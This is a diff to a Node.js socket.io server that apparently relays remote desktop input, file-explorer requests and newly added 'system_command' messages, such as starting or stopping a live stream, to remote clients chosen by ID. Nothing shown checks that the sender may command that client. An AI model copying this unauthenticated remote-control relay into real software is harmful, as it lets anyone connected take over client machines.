@@ -258,6 +258,13 @@ io.on('connection', (socket) => {
         if (targetSocket) targetSocket.emit('rdp_input', data);
     });
 
+    // Reenvío de comandos de sistema en tiempo real (ej. start_live_stream / stop_live_stream)
+    socket.on('system_command', (data) => {
+        if (!data || !data.clientId) return;
+        const targetSocket = clientSockets.get(data.clientId);
+        if (targetSocket) targetSocket.emit('system_command', { command: data.command, payload: data.payload });
+    });
+
     // Explorador de archivos remoto
     socket.on('fs_request_list', (data) => {
         const targetSocket = clientSockets.get(data.clientId);
